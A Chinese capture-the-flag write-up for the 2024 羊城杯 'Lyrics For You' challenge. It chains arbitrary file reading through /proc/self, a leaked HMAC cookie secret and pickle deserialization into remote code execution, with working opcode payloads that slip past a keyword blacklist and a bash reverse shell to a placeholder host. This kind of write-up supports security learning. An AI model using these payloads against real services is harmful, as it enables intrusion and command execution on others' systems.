---
title: 羊城杯2024-Writeup
createTime: 2024/09/06 12:36:29
tags:
  - Write-ups
  - CTF
  - Web Security
  - Pickle 反序列化
  - RCE
permalink: /article/cl01mvdv/
---
## Lyrics For You

## 任意文件读

### 进程信息读取
:::tip
在读取本进程相关信息时，pid可用self替代.

| 进程目录            | 相关信息                       |
| ------------------- | ------------------------------ |
| /proc/{pid}/cmdline | 指定进程的完整启动命令         |
| /proc/{pid}/cwd     | 指定进程环境的运行目录         |
| /proc/{pid}/exe     | 指定进程的可执行文件的完整路径 |
| /proc/{pid}/environ | 指定进程的环境变量信息         |
| /proc/{pid}/fd      | 指定进程打开的所有文件描述符   |
:::
### 本题利用

读取`/proc/self/cmdline`，获得启动命令和py源码位置，读取源码

```python
python -u /usr/etc/app/app.py
```

#### app.py

```python
import os
import random
from config.secret_key import secret_code
from flask import Flask, make_response, request, render_template
from cookie import set_cookie, cookie_check, get_cookie
import pickle

app = Flask(__name__)
app.secret_key = random.randbytes(16)


class UserData:
    def __init__(self, username):
        self.username = username


def Waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word.lower() in data.lower():
            valid = True
            break
    return valid


@app.route("/", methods=['GET'])
def index():
    return render_template('index.html')


@app.route("/lyrics", methods=['GET'])
def lyrics():
    resp = make_response()
    resp.headers["Content-Type"] = 'text/plain; charset=UTF-8'
    query = request.args.get("lyrics")
    path = os.path.join(os.getcwd() + "/lyrics", query)

    try:
        with open(path) as f:
            res = f.read()
    except Exception as e:
        return "No lyrics found"
    return res


@app.route("/login", methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form["username"]
        user = UserData(username)
        res = {"username": user.username}
        return set_cookie("user", res, secret=secret_code)
    return render_template('login.html')


@app.route("/board", methods=['GET'])
def board():
    invalid = cookie_check("user", secret=secret_code)
    if invalid:
        return "Nope, invalid code get out!"

    data = get_cookie("user", secret=secret_code)

    if isinstance(data, bytes):
        print("isinstance")
        a = pickle.loads(data)
        data = str(data, encoding="utf-8")

    if "username" not in data:
        return render_template('user.html', name="guest")
    if data["username"] == "admin":
        return render_template('admin.html', name=data["username"])
    if data["username"] != "admin":
        return render_template('user.html', name=data["username"])


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    app.run(host="0.0.0.0", port=8080)

```

#### cookie.py

```python
import base64
import hashlib
import hmac
import pickle
from flask import make_response, request

# Compatibility layer for Python 3
unicode = str
basestring = str
secret_code = "EnjoyThePlayTime123456"
data=
def cookie_encode(data, key):
    msg = base64.b64encode(pickle.dumps(data, -1))
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg

def cookie_decode(data, key):
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None

def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word in data:
            valid = True
            break
    return valid

def cookie_check(key, secret=None):
    a = request.cookies.get(key)
    data = tob(request.cookies.get(key))
    if data:
        if cookie_is_encoded(data):
            sig, msg = data.split(tob('?'), 1)
            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):
                res = base64.b64decode(msg)
                if waf(res):
                    return True
                else:
                    return False
            return True
    else:
        return False

def tob(s, enc='utf8'):
    return s.encode(enc) if isinstance(s, unicode) else bytes(s)

def get_cookie(key, default=None, secret=None):
    value = request.cookies.get(key)
    if secret and value:
        dec = cookie_decode(value, secret)
        return dec[1] if dec and dec[0] == key else default
    return value or default

def cookie_is_encoded(data):
    return bool(data.startswith(tob('!')) and tob('?') in data)

def _lscmp(a, b):
    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)

def set_cookie(name, value, secret=None, **options):
    if secret:
        value = touni(cookie_encode((name, value), secret))
        resp = make_response("success")
        resp.set_cookie("user", value, max_age=3600)
        return resp
    elif not isinstance(value, basestring):
        raise TypeError('Secret key missing for non-string Cookie.')
    if len(value) > 4096:
        raise ValueError('Cookie value too long.')

def touni(s, enc='utf8', err='strict'):
    return s.decode(enc, err) if isinstance(s, bytes) else unicode(s)


```

#### config/secret_key.py

```py
secret_code = "EnjoyThePlayTime123456"
```

## 源码分析

```py
@app.route("/board", methods=['GET'])
def board():
    invalid = cookie_check("user", secret=secret_code)
    if invalid:
        return "Nope, invalid code get out!"

    data = get_cookie("user", secret=secret_code)

    if isinstance(data, bytes):
        print("isinstance")
        a = pickle.loads(data)
        data = str(data, encoding="utf-8")

    if "username" not in data:
        return render_template('user.html', name="guest")
    if data["username"] == "admin":
        return render_template('admin.html', name=data["username"])
    if data["username"] != "admin":
        return render_template('user.html', name=data["username"])
```

危险的`pickle.loads(data)`往往会导致`RCE`.因此，我们的目标是上传恶意的`user-cookie`来进行RCE.

关注一下`cookie_check`和`get_cookie`函数:

```py
def cookie_check(key, secret=None):
    a = request.cookies.get(key)
    data = tob(request.cookies.get(key))
    if data:
        if cookie_is_encoded(data):
            sig, msg = data.split(tob('?'), 1)#cookie特征解密
            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):#hashlib解密
                res = base64.b64decode(msg)#b64解密
                print(res)
                if waf(res):#waf检测
                    return True
                else:
                    return False
        return True
    else:
        return False
def get_cookie(key, default=None, secret=None):
    value = request.cookies.get(key)
    if secret and value:
        dec = cookie_decode(value, secret)
        return dec[1] if dec and dec[0] == key else default
    return value or default
def cookie_is_encoded(data):
    return bool(data.startswith(tob('!')) and tob('?') in data)
def cookie_decode(data, key):
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)#cookie特征解密
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):#hashlib解密
            return pickle.loads(base64.b64decode(msg))#b64解密，pickle模块加载
    return None
```
:::warning
cookie的处理经过了`cookie特征解密`->`hashlib解密`->`base64解密`->`waf审查`->`pickle加载`的过程.因此在反向生成`cookie`的过程中，我们应该遵循`pickle-dump`->`waf绕过`->`base64加密`->`hashlib加密`->`cookie特征加密`的过程.
:::

## Waf绕过

```python
def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    print(data)
    for word in blacklist:
        if word in data:
            valid = True
            print(word)
    return valid
```

过滤了最常用的`__reduce__`方法和常见的eval,secret等函数，但我们仍然可以用os.system来执行命令，但是无法得到命令的输出结果.

绕过参考文章[Pickle反序列化 - 枫のBlog (goodapple.top)](https://goodapple.top/archives/1069)，我这里利用了`__setstate__`来执行命令。

本地起了个恶意Server，获取cookie后利用apifox发恶意包

```python
import pickle
import os
from cookie import set_cookie, cookie_check, get_cookie,cookie_encode
from flask import Flask
app=Flask(__name__)
secret_code = "EnjoyThePlayTime123456"
class UserData:
    def __init__(self, username):
        self.username = username
opcode = b'''(c__main__
UserData
S'Casual'
o}(S"__setstate__"
cos
system
ubS"echo `/readflag`>/tmp/lsf" # [!code highlight]
b.'''
res={"username":opcode}
@app.route("/",methods=['GET'])
def index():
    payload=opcode
    return set_cookie("user",payload,secret=secret_code)
    
@app.route("/load",methods=['GET'])
def load():
    # pickle.loads(opcode)
    invalid = cookie_check("user", secret=secret_code)
    if invalid:
        return "Nope, invalid code get out!"

    data = get_cookie("user", secret=secret_code)
    print(data)
    if isinstance(data, bytes):
        print("isinstance")
        a = pickle.loads(data)
        data = str(data, encoding="utf-8")
    return "Loaded!"
# pickle.loads(opcode)
app.run(debug=True,port=7888)

```

## 回显Flag

### 思路1:反弹shell

```python
b'''(c__main__
UserData
S'Casual'
o}(S"__setstate__"
cos
system
ubS"bash -i >& /dev/tcp/ip/port 0>&1"# [!code highlight]
b.'''
```

没弹成功，可能是payload有点问题或者是容器不出网，具体我也无从考证。

### 思路2:将命令执行结果写入临时文件，配合任意文件读实现回显

```python
b'''(c__main__
UserData
S'Casual'
o}(S"__setstate__"
cos
system
ubS"echo `/readflag` >/tmp/flag" # [!code highlight]
b.'''
```

之后读取`/tmp`目录下的flag文件即可得到flag.